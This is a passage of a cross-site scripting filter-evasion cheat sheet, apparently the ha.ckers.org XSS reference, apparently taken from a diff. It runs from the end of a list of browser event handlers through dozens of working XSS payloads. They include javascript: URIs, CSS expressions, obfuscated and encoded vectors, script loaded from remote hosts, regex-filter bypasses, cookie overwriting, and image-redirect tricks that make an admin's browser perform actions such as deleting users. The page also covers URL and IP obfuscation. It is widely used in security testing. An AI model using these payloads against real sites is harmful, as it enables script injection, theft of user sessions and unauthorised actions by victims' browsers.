onLoseCapture() (can be exploited by the releaseCapture() method) 51. onMediaComplete() (When a streaming media file is used, this event could fire before the file starts playing) 52. onMediaError() (User opens a page in the browser that contains a media file, and the event fires when there is a problem) 53. onMouseDown() (the attacker would need to get the user to click on an image) 54. onMouseEnter() (cursor moves over an object or area) 55. onMouseLeave() (the attacker would need to get the user to mouse over an image or table and then off again) 56. onMouseMove() (the attacker would need to get the user to mouse over an image or table) 57. onMouseOut() (the attacker would need to get the user to mouse over an image or table and then off again) 58. onMouseOver() (cursor moves over an object or area) 59. onMouseUp() (the attacker would need to get the user to click on an image) 60. onMouseWheel() (the attacker would need to get the user to use their mouse wheel) 61. onMove() (user or attacker would move the page) 62. onMoveEnd() (user or attacker would move the page) 63. onMoveStart() (user or attacker would move the page) 64. onOutOfSync() (interrupt the element's ability to play its media as defined by the timeline) 65. onPaste() (user would need to paste or attacker could use the execCommand("Paste") function) 66. onPause() (the onpause event fires on every element that is active when the timeline pauses, including the body element) 67. onProgress() (attacker would use this as a flash movie was loading) 68. onPropertyChange() (user or attacker would need to change an element property) 69. onReadyStateChange() (user or attacker would need to change an element property) 70. onRepeat() (the event fires once for each repetition of the timeline, excluding the first full cycle) 71. onReset() (user or attacker resets a form) 72. onResize() (user would resize the window; attacker could auto initialize with something like: <SCRIPT>self.resizeTo(500,400);</SCRIPT>) 73. onResizeEnd() (user would resize the window; attacker could auto initialize with something like: <SCRIPT>self.resizeTo(500,400);</SCRIPT>) 74. onResizeStart() (user would resize the window; attacker could auto initialize with something like: <SCRIPT>self.resizeTo(500,400);</SCRIPT>) 75. onResume() (the onresume event fires on every element that becomes active when the timeline resumes, including the body element) 76. onReverse() (if the element has a repeatCount greater than one, this event fires every time the timeline begins to play backward) 77. onRowsEnter() (user or attacker would need to change a row in a data source) 78. onRowExit() (user or attacker would need to change a row in a data source) 79. onRowDelete() (user or attacker would need to delete a row in a data source) 80. onRowInserted() (user or attacker would need to insert a row in a data source) 81. onScroll() (user would need to scroll, or attacker could use the scrollBy() function) 82. onSeek() (the onreverse event fires when the timeline is set to play in any direction other than forward) 83. onSelect() (user needs to select some text - attacker could auto initialize with something like: window.document.execCommand("SelectAll");) 84. onSelectionChange() (user needs to select some text - attacker could auto initialize with something like: window.document.execCommand("SelectAll");) 85. onSelectStart() (user needs to select some text - attacker could auto initialize with something like: window.document.execCommand("SelectAll");) 86. onStart() (fires at the beginning of each marquee loop) 87. onStop() (user would need to press the stop button or leave the webpage) 88. onSyncRestored() (user interrupts the element's ability to play its media as defined by the timeline to fire) 89. onSubmit() (requires attacker or user submits a form) 90. onTimeError() (user or attacker sets a time property, such as dur, to an invalid value) 91. onTrackChange() (user or attacker changes track in a playList) 92. onUnload() (as the user clicks any link or presses the back button or attacker forces a click) 93. onURLFlip() (this event fires when an Advanced Streaming Format (ASF) file, played by a HTML+TIME (Timed Interactive Multimedia Extensions) media tag, processes script commands embedded in the ASF file) 94. seekSegmentTime() (this is a method that locates the specified point on the element's segment time line and begins playing from that point. The segment consists of one repetition of the time line including reverse play using the AUTOREVERSE attribute.)
+IMG Dynsrc
+<IMG DYNSRC="javascript:alert('XSS')">
+IMG lowsrc
+<IMG LOWSRC="javascript:alert('XSS')">
+BGSOUND
+<BGSOUND SRC="javascript:alert('XSS');">
+& JavaScript includes
+(works in Netscape 4.x):
+<BR SIZE="&{alert('XSS')}">
+NS4
+LAYER
+(also only works in Netscape 4.x)
+<LAYER SRC="http://ha.ckers.org/scriptlet.html"></LAYER>
+STYLE sheet
+<LINK REL="stylesheet" HREF="javascript:alert('XSS');">
+Remote style sheet
+(using something as simple as a remote style sheet you can include your XSS as the style parameter can be redefined using an embedded expression.) This only works in IE and Netscape 8.1+ in IE rendering engine mode. Notice that there is nothing on the page to show that there is included JavaScript. Note: With all of these remote style sheet examples they use the body tag, so it won't work unless there is some content on the page other than the vector itself, so you'll need to add a single letter to the page to make it work if it's an otherwise blank page:
+<LINK REL="stylesheet" HREF="http://ha.ckers.org/xss.css">
+Remote style sheet part 2
+(this works the same as above, but uses a <STYLE> tag instead of a <LINK> tag). A slight variation on this vector was used to
+hack Google Desktop
+. As a side note, you can remove the end </STYLE> tag if there is HTML immediately after the vector to close it. This is useful if you cannot have either an equals sign or a slash in your cross site scripting attack, which has come up at least once in the real world:
+<STYLE>@import'http://ha.ckers.org/xss.css';</STYLE>
+Remote style sheet part 3
+. This only works in Opera 8.0 (no longer in 9.x) but is fairly tricky. According to
+RFC2616
+setting a link header is not part of the HTTP1.1 spec, however some browsers still allow it (like Firefox and Opera). The trick here is that I am setting a header (which is basically no different than in the HTTP header saying Link: <http://ha.ckers.org/xss.css>; REL=stylesheet) and the remote style sheet with my cross site scripting vector is running the JavaScript, which is not supported in FireFox:
+<META HTTP-EQUIV="Link" Content="<http://ha.ckers.org/xss.css>; REL=stylesheet">
+Remote style sheet part 4
+. This only works in Gecko rendering engines and works by binding an XUL file to the parent page. I think the irony here is that Netscape assumes that Gecko is safer and therefor is vulnerable to this for the vast majority of sites:
+<STYLE>BODY{-moz-binding:url("http://ha.ckers.org/xssmoz.xml#xss")}</STYLE>
+Local htc file
+. This is a little different than the above two cross site scripting vectors because it uses an .htc file which must be on the same server as the XSS vector. The example file works by pulling in the JavaScript and running it as part of the style attribute:
+<XSS STYLE="behavior: url(xss.htc);">
+List-style-image
+. Fairly esoteric issue dealing with embedding images for bulleted lists. This will only work in the IE rendering engine because of the JavaScript directive. Not a particularly useful cross site scripting vector:
+<STYLE>li {list-style-image: url("javascript:alert('XSS')");}</STYLE><UL><LI>XSS
+VBscript
+in an image:
+<IMG SRC='vbscript:msgbox("XSS")'>
+Mocha
+(older versions of Netscape only):
+<IMG SRC="mocha:[code]">
+Livescript
+<IMG SRC="livescript:[code]">
+US-ASCII
+encoding (found by
+Kurt Huwig
+). This uses malformed ASCII encoding with 7 bits instead of 8. This XSS may bypass many content filters but only works if the host transmits in US-ASCII encoding, or if you set the encoding yourself. This is more useful against web application firewall cross site scripting evasion than it is server side filter evasion. Apache Tomcat is the only known server that transmits in US-ASCII encoding. I highly suggest anyone interested in alternate encoding issues look at
+my charsets issues
+page:
+¼script¾alert(¢XSS¢)¼/script¾
+META
+(the odd thing about meta refresh is that it doesn't send a referrer in the header - so it can be used for certain types of attacks where you need to get rid of referring URLs):
+<META HTTP-EQUIV="refresh" CONTENT="0;url=javascript:alert('XSS');">
+META using data: directive
+URL scheme. This is nice because it also doesn't have anything visibly that has the word SCRIPT or the JavaScript directive in it, because it utilizes base64 encoding. Please see
+RFC 2397
+for more details or go
+or
+to encode your own. You can also use the
+below if you just want to encode raw HTML or JavaScript as it has a Base64 encoding method:
+<META HTTP-EQUIV="refresh" CONTENT="0;url=data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K">
+META with additional URL parameter
+. If the target website attempts to see if the URL contains "http://" at the beginning you can evade it with the following technique (Submitted by
+Moritz Naumann
+):
+<META HTTP-EQUIV="refresh" CONTENT="0; URL=http://;URL=javascript:alert('XSS');">
+IFRAME
+(if iframes are allowed there are a lot of other XSS problems as well):
+<IFRAME SRC="javascript:alert('XSS');"></IFRAME>
+FRAME
+(frames have the same sorts of XSS problems as iframes):
+<FRAMESET><FRAME SRC="javascript:alert('XSS');"></FRAMESET>
+TABLE
+(who would have thought tables were XSS targets... except me, of course):
+<TABLE BACKGROUND="javascript:alert('XSS')">
+TD
+(just like above, TD's are vulnerable to BACKGROUNDs containing JavaScript XSS vectors):
+<TABLE><TD BACKGROUND="javascript:alert('XSS')">
+DIV background-image
+<DIV STYLE="background-image: url(javascript:alert('XSS'))">
+DIV background-image with unicoded XSS
+exploit (this has been modified slightly to obfuscate the url parameter). The original vulnerability was found by
+Renaud Lifchitz
+as a vulnerability in Hotmail:
+<DIV STYLE="background-image:\0075\0072\006C\0028'\006a\0061\0076\0061\0073\0063\0072\0069\0070\0074\003a\0061\006c\0065\0072\0074\0028.1027\0058.1053\0053\0027\0029'\0029">
+DIV background-image plus extra characters
+. I built a quick XSS fuzzer to detect any erroneous characters that are allowed after the open parenthesis but before the JavaScript directive in IE and Netscape 8.1 in secure site mode. These are in decimal but you can include hex and add padding of course. (Any of the following chars can be used: 1-32, 34, 39, 160, 8192-8.13, 12288, 65279):
+<DIV STYLE="background-image: url(&#1;javascript:alert('XSS'))">
+DIV expression
+- a variant of this was effective against a real world cross site scripting filter using a newline between the colon and "expression":
+<DIV STYLE="width: expression(alert('XSS'));">
+STYLE
+tags with broken up JavaScript for XSS (this XSS at times sends IE into an infinite loop of alerts):
+<STYLE>@im\port'\ja\vasc\ript:alert("XSS")';</STYLE>
+STYLE attribute using a comment
+to break up expression (Thanks to
+Roman Ivanov
+for this one):
+<IMG STYLE="xss:expr/*XSS*/ession(alert('XSS'))">
+Anonymous HTML with STYLE attribute
+(IE6.0 and Netscape 8.1+ in IE rendering engine mode don't really care if the HTML tag you build exists or not, as long as it starts with an open angle bracket and a letter):
+<XSS STYLE="xss:expression(alert('XSS'))">
+IMG STYLE with expression
+(this is really a hybrid of the above XSS vectors, but it really does show how hard STYLE tags can be to parse apart, like above this can send IE into a loop):
+exp/*<A STYLE='no\xss:noxss("*//*"); xss:&#101;x&#x2F;*XSS*//*/*/pression(alert("XSS"))'>
+STYLE tag
+(Older versions of Netscape only):
+<STYLE TYPE="text/javascript">alert('XSS');</STYLE>
+STYLE tag using background-image
+<STYLE>.XSS{background-image:url("javascript:alert('XSS')");}</STYLE><A CLASS=XSS></A>
+STYLE tag using background
+<STYLE type="text/css">BODY{background:url("javascript:alert('XSS')")}</STYLE>
+Downlevel-Hidden
+block (only works in IE5.0 and later and Netscape 8.1 in IE rendering engine mode). Some websites consider anything inside a comment block to be safe and therefore does not need to be removed, which allows our Cross Site Scripting vector. Or the system could add comment tags around something to attempt to render it harmless. As we can see, that probably wouldn't do the job:
+<!--[if gte IE 4]> <SCRIPT>alert('XSS');</SCRIPT> <![endif]-->
+BASE
+tag. Works in IE and Netscape 8.1 in safe mode. You need the // to comment out the next characters so you won't get a JavaScript error and your XSS tag will render. Also, this relies on the fact that the website uses dynamically placed images like "images/image.jpg" rather than full paths. If the path includes a leading forward slash like "/images/image.jpg" you can remove one slash from this vector (as long as there are two to begin the comment this will work):
+<BASE HREF="javascript:alert('XSS');//">
+OBJECT
+tag (if they allow objects, you can also inject virus payloads to infect the users, etc. and same with the APPLET tag). The linked file is actually an HTML file that can contain your XSS:
+<OBJECT TYPE="text/x-scriptlet" DATA="http://ha.ckers.org/scriptlet.html"></OBJECT>
+Using an OBJECT tag
+you can embed XSS directly (this is unverified so no browser support is added):
+<OBJECT classid=clsid:ae24fdae-03c6-11d1-8b76-0080c744f389><param name=url value=javascript:alert('XSS')></OBJECT>
+Using an EMBED tag
+you can embed a Flash movie that contains XSS.
+Click here for a demo
+. If you add the attributes allowScriptAccess="never" and allownetworking="internal" it can mitigate this risk (thank you to Jonathan Vanasco for the info).:
+<EMBED SRC="http://ha.ckers.org/xss.swf" AllowScriptAccess="always"></EMBED>
+You can EMBED SVG
+which can contain your XSS vector. This example only works in Firefox, but it's better than the above vector in Firefox because it does not require the user to have Flash turned on or installed. Thanks to
+nEUrOO
+for this one.
+<EMBED SRC="data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg==" type="image/svg+xml" AllowScriptAccess="always"></EMBED>
+Using ActionScript
+inside flash can obfuscate your XSS vector:
+a="get"; b="URL(\""; c="javascript:"; d="alert('XSS');\")"; eval(a+b+c+d);
+XML namespace
+. The htc file must be located on the same server as your XSS vector:
+<HTML xmlns:xss> <?import namespace="xss" implementation="http://ha.ckers.org/xss.htc"> <xss:xss>XSS</xss:xss> </HTML>
+XML data island
+with CDATA obfuscation (this XSS attack works only in IE and Netscape 8.1 in IE rendering engine mode) - vector found by
+Sec Consult
+while auditing Yahoo:
+<XML ID=I><X><C><![CDATA[<IMG SRC="javas]]><![CDATA[cript:alert('XSS');">]]> </C></X></xml><SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML></SPAN>
+XML data island with comment obfuscation
+(this is another take on the same exploit that doesn't use CDATA fields, but rather uses comments to break up the javascript directive):
+<XML ID="xss"><I><B>&lt;IMG SRC="javas<!-- -->cript:alert('XSS')"&gt;</B></I></XML> <SPAN DATASRC="#xss" DATAFLD="B" DATAFORMATAS="HTML"></SPAN>
+Locally hosted XML with embedded JavaScript
+that is generated using an XML data island. This is the same as above but instead referrs to a locally hosted (must be on the same server) XML file that contains your cross site scripting vector. You can see the result
+<XML SRC="xsstest.xml" ID=I></XML> <SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML></SPAN>
+HTML+TIME in XML
+. This is how
+Grey Magic hacked Hotmail and Yahoo!
+. This only works in Internet Explorer and Netscape 8.1 in IE rendering engine mode and remember that you need to be between HTML and BODY tags for this to work:
+<HTML><BODY> <?xml:namespace prefix="t" ns="urn:schemas-microsoft-com:time"> <?import namespace="t" implementation="#default#time2"> <t:set attributeName="innerHTML" to="XSS&lt;SCRIPT DEFER&gt;alert(&quot;XSS&quot;)&lt;/SCRIPT&gt;"> </BODY></HTML>
+Assuming you can only fit in a few characters and it filters against ".js" you can rename your JavaScript
+file to an image as an XSS vector:
+<SCRIPT SRC="http://ha.ckers.org/xss.jpg"></SCRIPT>
+SSI
+(Server Side Includes) requires SSI to be installed on the server to use this XSS vector. I probably don't need to mention this, but if you can run commands on the server there are no doubt much more serious issues:
+<!--#exec cmd="/bin/echo '<SCR'"--><!--#exec cmd="/bin/echo 'IPT SRC=http://ha.ckers.org/xss.js></SCRIPT>'"-->
+PHP
+- requires PHP to be installed on the server to use this XSS vector. Again, if you can run any scripts remotely like this, there are probably much more dire issues:
+<? echo('<SCR)'; echo('IPT>alert("XSS")</SCRIPT>'); ?>
+IMG Embedded
+commands - this works when the webpage where this is injected (like a web-board) is behind password protection and that password protection works with other commands on the same domain. This can be used to delete users, add users (if the user who visits the page is an administrator), send credentials elsewhere, etc.... This is one of the lesser used but more useful XSS vectors:
+<IMG SRC="http://www.thesiteyouareon.com/somecommand.php?somevariables=maliciouscode">
+IMG Embedded commands part II
+- this is more scary because there are absolutely no identifiers that make it look suspicious other than it is not hosted on your own domain. The vector uses a 302 or 304 (others work too) to redirect the image back to a command. So a normal <IMG SRC="http://badguy.com/a.jpg"> could actually be an attack vector to run commands as the user who views the image link. Here is the .htaccess (under Apache) line to accomplish the vector (thanks to Timo for part of this):
+Redirect 302 /a.jpg http://victimsite.com/admin.asp&deleteuser
+Cookie manipulation
+- admittidly this is pretty obscure but I have seen a few examples where <META is allowed and you can use it to overwrite cookies. There are other examples of sites where instead of fetching the username from a database it is stored inside of a cookie to be displayed only to the user who visits the page. With these two scenarios combined you can modify the victim's cookie which will be displayed back to them as JavaScript (you can also use this to log people out or change their user states, get them to log in as you, etc...):
+<META HTTP-EQUIV="Set-Cookie" Content="USERID=&lt;SCRIPT&gt;alert('XSS')&lt;/SCRIPT&gt;">
+UTF-7
+encoding - if the page that the XSS resides on doesn't provide a page charset header, or any browser that is set to UTF-7 encoding can be exploited with the following (Thanks to
+for this one). Click
+for an example (you don't need the charset statement if the user's browser is set to auto-detect and there is no overriding content-types on the page in Internet Explorer and Netscape 8.1 in IE rendering engine mode). This does not work in any modern browser without changing the encoding type which is why it is marked as completely unsupported.
+Watchfire found this hole
+in Google's custom 404 script.:
+<HEAD><META HTTP-EQUIV="CONTENT-TYPE" CONTENT="text/html; charset=UTF-7"> </HEAD>+ADw-SCRIPT+AD4-alert('XSS');+ADw-/SCRIPT+AD4-
+XSS using HTML quote encapsulation:
+This was tested in IE, your mileage may vary. For performing XSS on sites that allow "<SCRIPT>" but don't allow "<SCRIPT SRC..." by way of a regex filter "/<script[^>]+src/i":
+<SCRIPT a=">" SRC="http://ha.ckers.org/xss.js"></SCRIPT>
+For performing XSS on sites that allow "<SCRIPT>" but don't allow "<script src..." by way of a regex filter "/<script((\s+\w+(\s*=\s*(?:"(.)*?"|'(.)*?'|[^'">\s]+))?)+\s*|\s*)src/i" (this is an important one, because I've seen this regex in the wild):
+<SCRIPT =">" SRC="http://ha.ckers.org/xss.js"></SCRIPT>
+Another XSS to evade the same filter, "/<script((\s+\w+(\s*=\s*(?:"(.)*?"|'(.)*?'|[^'">\s]+))?)+\s*|\s*)src/i":
+<SCRIPT a=">" '' SRC="http://ha.ckers.org/xss.js"></SCRIPT>
+Yet another XSS to evade the same filter, "/<script((\s+\w+(\s*=\s*(?:"(.)*?"|'(.)*?'|[^'">\s]+))?)+\s*|\s*)src/i". I know I said I wasn't goint to discuss mitigation techniques but the only thing I've seen work for this XSS example if you still want to allow <SCRIPT> tags but not remote script is a state machine (and of course there are other ways to get around this if they allow <SCRIPT> tags):
+<SCRIPT "a='>'" SRC="http://ha.ckers.org/xss.js"></SCRIPT>
+And one last XSS attack to evade, "/<script((\s+\w+(\s*=\s*(?:"(.)*?"|'(.)*?'|[^'">\s]+))?)+\s*|\s*)src/i" using grave accents (again, doesn't work in Firefox):
+<SCRIPT a=`>` SRC="http://ha.ckers.org/xss.js"></SCRIPT>
+Here's an XSS example that bets on the fact that the regex won't catch a matching pair of quotes but will rather find any quotes to terminate a parameter string improperly:
+<SCRIPT a=">'>" SRC="http://ha.ckers.org/xss.js"></SCRIPT>
+This XSS still worries me, as it would be nearly impossible to stop this without blocking all active content:
+<SCRIPT>document.write("<SCRI");</SCRIPT>PT SRC="http://ha.ckers.org/xss.js"></SCRIPT>
+URL string evasion (assuming "http://www.google.com/" is programmatically disallowed):
+IP verses hostname:
+<A HREF="http://66.102.7.147/">XSS</A>
+URL encoding:
+<A HREF="http://%77%77%77%2E%67%6F%6F%67%6C%65%2E%63%6F%6D">XSS</A>
+Dword encoding (Note: there are other of variations of Dword encoding - see the
+IP Obfuscation calculator below
+for more details):
+<A HREF="http://1113982867/">XSS</A>
+Hex encoding (the total size of each number allowed is somewhere in the neighborhood of 240 total characters as you can see on the second digit, and since the hex number is between 0 and F the leading zero on the third hex quotet is not required):
+<A HREF="http://0x42.0x0000066.0x7.0x93/">XSS</A>
+Octal encoding (again padding is allowed, although you must keep it above 4 total characters per class - as in class A, class B, etc...):
+<A HREF="http://0102.0146.0007.00000223/">XSS</A>
+Mixed encoding (let's mix and match base encoding and throw in some tabs and newlines - why browsers allow this, I'll never know). The tabs and newlines only work if this is encapsulated with quotes:
+<A HREF="h tt p://6&#9;6.000146.0x7.147/">XSS</A>
+Protocol resolution bypass (// translates to http:// which saves a few more bytes). This is really handy when space is an issue too (two less characters can go a long way) and can easily bypass regex like "(ht|f)tp(s)?://" (thanks to
+Ozh
+for part of this one). You can also change the "//" to "\\". You do need to keep the slashes in place, however, otherwise this will be interpreted as a relative path URL.
+<A HREF="//www.google.com/">XSS</A>
+Google "feeling lucky" part 1. Firefox uses Google's "feeling lucky" function to redirect the user to any keywords you type in. So if your exploitable page is the top for some random keyword (as you see here) you can use that feature against any Firefox user. This uses Firefox's "keyword:" protocol. You can concatinate several keywords by using something like the following "keyword:XSS+RSnake" for instance. This no longer works within Firefox as of 2.0.
+<A HREF="//google">XSS</A>
+Google "feeling lucky" part 2. This uses a very tiny trick that appears to work Firefox only, because if it's implementation of the "feeling lucky" function. Unlike the next one this does not work in Opera because Opera believes that this is the old HTTP Basic Auth phishing attack, which it is not. It's simply a malformed URL. If you click okay on the dialogue it will work, but as a result of the erroneous dialogue box I am saying that this is not supported in Opera, and it is no longer supported in Firefox as of 2.0:
+<A HREF="http://ha.ckers.org@google">XSS</A>
+Google "feeling lucky" part 3. This uses a malformed URL that appears to work in Firefox and Opera only, because if their implementation of the "feeling lucky" function. Like all of the above it requires that you are #1 in Google for the keyword in question (in this case "google"):
+<A HREF="http://google:ha.ckers.org">XSS</A>
+Removing cnames (when combined with the above URL, removing "www." will save an additional 4 bytes for a total byte savings of 9 for servers that have this set up properly):
+<A HREF="http://google.com/">XSS</A>
+Extra dot for absolute DNS:
+<A HREF="http://www.google.com./">XSS</A>
+JavaScript link location:
+<A HREF="javascript:document.location='http://www.google.com/'">XSS</A>
+Content replace as attack vector (assuming "http://www.google.com/" is programmatically replaced with nothing). I actually used a similar attack vector against a several separate real world XSS filters by using the conversion filter itself (
+here is an example
+) to help create the attack vector (IE: "java&#x26;#x09;script:" was converted into "java&#x09;script:", which renders in IE, Netscape 8.1+ in secure site mode and Opera):
+<A HREF="http://www.gohttp://www.google.com/ogle.com/">XSS</A>
+Character Encoding:
+All the possible combinations of the character "<" in HTML and JavaScript (in UTF-8). Most of these won't render out of the box, but many of them can get rendered in certain circumstances as seen above (standards are great, aren't they?):
+< %3C &lt &lt; &LT &LT; &#60 &#060 &#0060 &#00060 &#000060 &#0000060 &#60; &#060; &#0060; &#00060; &#000060; &#0000060; &#x3c &#x03c &#x003c &#x0003c &#x00003c &#x000003c &#x3c; &#x03c; &#x003c; &#x0003c; &#x00003c; &#x000003c; &#X3c &#X03c &#X003c &#X0003c &#X00003c &#X000003c &#X3c; &#X03c; &#X003c; &#X0003c; &#X00003c; &#X000003c; &#x3C &#x03C &#x003C &#x0003C &#x00003C &#x000003C &#x3C; &#x03C; &#x003C; &#x0003C; &#x00003C; &#x000003C; &#X3C &#X03C &#X003C &#X0003C &#X00003C &#X000003C &#X3C; &#X03C; &#X003C; &#X0003C; &#X00003C; &#X000003C; \x3c \x3C \u003c \u003C
+Character Encoding Calculator
+ASCII Text:
+Enter your XSS here
+Hex Value:
+URL:
+HTML (with semicolons):
+Decimal Value:
+HTML (without semicolons):
+Base64 Value
+(
+a more robust base64 calculator can be found here
+)
+Base64:
+IP Obfuscation Calculator
+IP Address:
+: dword level
+Dword Address:
+Hex Address:
+Octal Address:
+Browser support reference table:
+Vector works in Internet Explorer 7.0. Most recently tested with Internet Explorer 7.0.5700.6 RC1, Windows XP Professional SP2.
+Vector works in Internet Explorer. Most recently tested with Internet Explorer 6.0.28.1.1106CO, SP2 on Windows 2000.
+Vector works in Netscape 8.1+ in IE rendering engine mode. Most recently tested with Netscape 8.1 on Windows XP Professional. This used to be called trusted mode, but Netscape has changed it's security model away from the trusted/untrusted model and has opted towards Gecko as a default and IE as an option.
+Vector works in Netscape 8.1+ in the Gecko rendering engine mode. Most recently tested with Netscape 8.1 on Windows XP Professional
+Vector works in Mozilla's Gecko rendering engine, used by Firefox. Most recently tested with Firefox 2.0.0.2 on Windows XP Professional.
+Vector works in Opera. Most recently tested with Opera 9.02, Build 8586 on Windows XP Professional
+Vector works in older versions of Netscape 4.0 - untested.
+Note: if a vector is not marked it either does not work or it is untested.
+Written in vim, and UTF-8 encoded, for her pleasure.
+All rights reserved, all wrongs observed.
+© 1995-2008
